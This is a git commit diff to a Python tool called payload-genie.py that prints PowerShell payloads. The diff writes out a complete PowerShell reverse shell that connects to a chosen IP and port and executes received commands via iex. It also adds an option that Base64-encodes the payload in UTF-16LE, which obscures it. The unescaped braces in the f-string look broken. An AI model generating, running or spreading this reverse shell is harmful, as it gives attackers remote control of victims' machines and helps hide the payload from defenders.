6846487ab57d835e704f16a2e91fb7574a8b151b
Nicholas Abraham <n.abraham.2003@gmail.com>
2026-07-18 17:32:45 +1000

    Created Base64 encoded powershell option

--- payload-genie.py
+++ payload-genie.py
@@ -1,3 +1,5 @@
+import base64
+
 def powershell():
     print("Using powershell option...")
     print("1. Reverse Shell")
@@ -7,10 +9,37 @@ def powershell():
         print(f"Chosen option: {option}")
         ip = input("Local Host IP: ")
         port = input("Local Host Port: ")
+        payload = (
+            f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]"
+            "$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object "
+            "-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
+            "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        )
         print("Generating Powershell Reverse Shell...")
         print("======================================")
-        print(f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
+        print(payload)
         print("======================================")
+    elif option == '2':
+        print(f"Chosen option: {option}")
+        ip = input("Local Host IP: ")
+        port = input("Local Host Port: ")
+        payload = (
+            f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]"
+            "$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object "
+            "-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
+            "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        )
+
+        encoded_payload = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
+        print("Generating Powershell Reverse Shell...")
+        print("======================================")
+        print(encoded_payload)
+        print("======================================")
+    else:
+        print("nah bro")
+
 def loop():
     print("Payload Options:")
     print("1. Powershell")
@@ -18,6 +47,8 @@ def loop():
 
     if option == '1':
         powershell()
+    else:
+        print("Unsupported option!")
 
 def main():
     while True:
